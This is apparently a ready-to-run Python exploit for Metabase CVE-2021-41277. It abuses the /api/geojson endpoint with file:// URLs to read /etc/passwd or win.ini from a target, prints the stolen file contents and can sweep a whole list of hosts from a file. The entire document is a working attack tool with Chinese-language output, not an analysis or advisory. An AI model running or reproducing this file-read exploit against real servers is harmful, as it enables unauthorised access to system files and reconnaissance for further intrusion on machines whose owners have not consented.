#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import urllib3
import sys
from bs4 import BeautifulSoup
import base64
urllib3.disable_warnings()

def title():
    print("""
                          Metabase 任意文件读取
                    use: python3  Metabase-cve-2021-41277.py
                           Author: Henry4E36
    """)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url_linux(self):
        target_url = self.url + "/api/geojson?url=file:///etc/passwd"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
        }

        try:
            res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
            if "root:x" in res.text and res.status_code == 200:
                return "linux", self.url, res.text.strip()
            else:
                return "No linux", self.url, res.text.strip()
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！")
            print("[" + "-"*100 + "]")
            sys.exit(0)

    def target_url_windows(self):
        target_url = self.url + "/api/geojson?url=file://c://windows/win.ini"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
        }

        try:
            res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
            if "for 16-bit app support" in res.text and res.status_code == 200:
                return "windows", self.url, res.text.strip()
            else:
                return "No windows", self.url, res.text.strip()
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！")
            print("[" + "-"*100 + "]")

    def results(self):
        result_txt = information.target_url_linux(self)
        if result_txt[0] == "linux":
            print(f"\033[31m[{chr(8730)}] 目标系统(Linux): {result_txt[1]} 存在任意文件读取\033[0m")
            print(f"\033[31m[{chr(8730)}] 读取：/etc/passwd 文件:\n{result_txt[-1]}")
            print("[" + "-" * 100 + "]")
        else:
            result_txt = information.target_url_windows(self)
            if result_txt[0] == "windows":
                print(f"\033[31m[{chr(8730)}] 目标系统(Windows): {result_txt[1]} 存在任意文件读取\033[0m")
                print(f"\033[31m[{chr(8730)}] 读取：win.in 文件:\n{result_txt[-1]}")
                print("[" + "-" * 100 + "]")
            else:
                print(f"\033[31m[{chr(8730)}] 目标系统: {result_txt[1]} 不存在任意文件读取\033[0m")
                print("[" + "-" * 100 + "]")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.results(self)
        urls.close()


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="Metabase 任意文件读取 Options")
    parser.add_argument("-u", "--url", metavar="url", type=str, help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 Metabase-cve-2021-41277.py -u http://127.0.0.1\neg2:>>>python3 Metabase-cve-2021-41277.py -f ip.txt")
    elif args.url:
        information(args).results()
    elif args.file:
        information(args).file_url()
